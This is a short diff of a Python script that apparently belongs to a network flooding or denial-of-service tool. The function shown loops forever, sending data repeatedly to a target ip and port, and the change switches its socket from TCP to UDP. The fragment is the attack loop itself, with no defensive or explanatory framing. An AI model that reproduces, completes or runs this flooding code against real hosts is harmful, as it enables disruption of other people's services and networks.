@@ -37,7 +37,7 @@ def run2():
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
